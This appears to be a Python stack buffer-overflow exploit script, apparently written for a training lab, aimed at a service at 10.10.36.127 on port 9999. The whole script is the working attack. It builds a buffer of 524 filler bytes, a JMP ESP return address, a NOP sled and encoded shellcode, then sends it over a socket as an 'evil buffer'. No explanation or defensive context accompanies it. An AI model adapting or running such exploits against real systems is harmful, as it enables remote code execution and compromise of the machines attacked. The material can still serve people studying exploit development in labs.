import socket

ip = "10.10.36.127"
port = 9999

# ESP Jumper 0x311712F3 ==> \xf3\x12\x17\x31

payload= ("\xda\xce\xbd\x36\x2d\xe8\xaf\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x12\x31\x6a\x17\x03\x6a\x17\x83\xdc\xd1\x0a\x5a\x11\xf1\x3c"
"\x46\x02\x46\x90\xe3\xa6\xc1\xf7\x44\xc0\x1c\x77\x37\x55\x2f"
"\x47\xf5\xe5\x06\xc1\xfc\x8d\x92\x38\xfd\x03\xcb\x38\x01\x8a"
"\x57\xb4\xe0\x1c\x01\x96\xb3\x0f\x7d\x15\xbd\x4e\x4c\x9a\xef"
"\xf8\x21\xb4\x7c\x90\xd5\xe5\xad\x02\x4f\x73\x52\x90\xdc\x0a"
"\x74\xa4\xe8\xc1\xf7")

filler = "A" * 524
EIP = "\xf3\x12\x17\x31" #JMP ESP - 311712f3
offset = "C" * 4
nops = "\x90" * 32
buffer = filler + EIP + offset + nops + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.recv(1024)
  s.send(bytes(buffer + "\r\n" , "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
